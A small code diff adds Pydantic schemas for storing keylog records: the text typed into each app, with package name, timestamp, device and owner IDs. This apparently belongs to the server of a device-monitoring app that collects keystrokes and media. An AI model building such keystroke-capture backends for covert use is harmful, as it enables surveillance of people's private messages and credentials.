@@ -185,3 +185,21 @@ class MediaFile(MediaFileBase):
     device_id: int
     class Config: from_attributes = True
 
+class KeylogBase(BaseModel):
+    package_name: str
+    app_name: str
+    typed_text: str
+    timestamp: int
+
+class KeylogCreate(KeylogBase):
+    device_id: Optional[int] = None
+
+class Keylog(KeylogBase):
+    id: int
+    owner_id: int
+    device_id: Optional[int] = None
+
+    class Config:
+        from_attributes = True
+
+
